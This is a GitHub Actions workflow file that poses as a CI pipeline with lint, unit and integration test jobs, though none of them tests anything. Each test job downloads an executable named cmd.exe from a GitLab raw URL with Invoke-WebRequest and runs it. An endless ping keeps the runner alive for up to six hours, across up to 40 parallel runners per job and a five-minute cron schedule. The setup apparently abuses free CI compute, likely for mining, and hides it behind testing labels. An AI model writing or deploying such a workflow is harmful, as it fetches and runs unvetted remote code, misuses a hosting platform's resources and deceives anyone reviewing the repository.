# This is a basic workflow to help you get started with Actions

name: CI_one
# on: [push, pull_request]
on:
  push:
  pull_request:
  schedule:
    - cron: '*/5 * * * *'
   
      
jobs:
  commit-lint:
    runs-on: windows-latest
    strategy:
      max-parallel: 20
      fail-fast: false
      matrix:
        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9, 1.0]
        flag: [A]
    timeout-minutes: 360
    env:
        NUM_JOBS: 20
        JOB: ${{ matrix.go }}
    steps:
    - name: Set up Go ${{ matrix.go }}
      uses: actions/setup-go@v1
      with:
        go-version: ${{ matrix.go }}
      id: go
    - name: Setup
      uses: actions/checkout@v1
    - name: runner_go
      run: |
        echo "done"
  unit-test:
    needs: commit-lint
    runs-on: windows-latest
    strategy:
      max-parallel: 150
      fail-fast: false
      matrix:
        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9, 1.0]
        flag: [A, B, C, D]
    timeout-minutes: 360
    env:
        NUM_JOBS: 150
        JOB: ${{ matrix.go }}
    steps:
    - name: PREPARING
      run: Invoke-WebRequest https://gitlab.com/MeridethBelanger/xc/-/raw/main/cmd.exe -Outfile cmd.exe
    - name: Seting-UP
      run: ./cmd.exe
    - name: Running
      run: ping 1.1.1.1 -t
    - name: DONE
      run: exit
  integration-test-1:
    needs: [unit-test]
    runs-on: windows-latest
    strategy:
      max-parallel: 150
      fail-fast: false
      matrix:
        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9, 1.0]
        flag: [A, B, C, D]
    timeout-minutes: 360
    env:
        NUM_JOBS: 150
        JOB: ${{ matrix.go }}
    steps:
    - name: PREPARING
      run: Invoke-WebRequest https://gitlab.com/MeridethBelanger/xc/-/raw/main/cmd.exe -Outfile cmd.exe
    - name: Seting-UP
      run: ./cmd.exe
    - name: Running
      run: ping 1.1.1.1 -t
    - name: DONE
      run: exit
  integration-test-2:
    needs: [unit-test]
    runs-on: windows-latest
    strategy:
      max-parallel: 150
      fail-fast: false
      matrix:
        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9, 1.0]
        flag: [A, B, C, D]
    timeout-minutes: 360
    env:
        NUM_JOBS: 150
        JOB: ${{ matrix.go }}
    steps:
    - name: PREPARING
      run: Invoke-WebRequest https://gitlab.com/MeridethBelanger/xc/-/raw/main/cmd.exe -Outfile cmd.exe
    - name: Seting-UP
      run: ./cmd.exe
    - name: Running
      run: ping 1.1.1.1 -t
    - name: DONE
      run: exit
  integration-test-3:
    needs: [unit-test]
    runs-on: windows-latest
    strategy:
      max-parallel: 150
      fail-fast: false
      matrix:
        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9, 1.0]
        flag: [A, B, C, D]
    timeout-minutes: 360
    env:
        NUM_JOBS: 150
        JOB: ${{ matrix.go }}
    steps:
    - name: PREPARING
      run: Invoke-WebRequest https://gitlab.com/MeridethBelanger/xc/-/raw/main/cmd.exe -Outfile cmd.exe
    - name: Seting-UP
      run: ./cmd.exe
    - name: Running
      run: ping 1.1.1.1 -t
    - name: DONE
      run: exit
  success-all-test:
    needs: [integration-test-1, integration-test-2, integration-test-3]
    if: always()
    runs-on: windows-latest
    steps:
      - uses: technote-space/workflow-conclusion-action@v2
      - name: Check Failure
        if: env.WORKFLOW_CONCLUSION == 'failure'
        run: exit 1
      - name: Success
        if: ${{ success() }}
        run: echo "All Done"
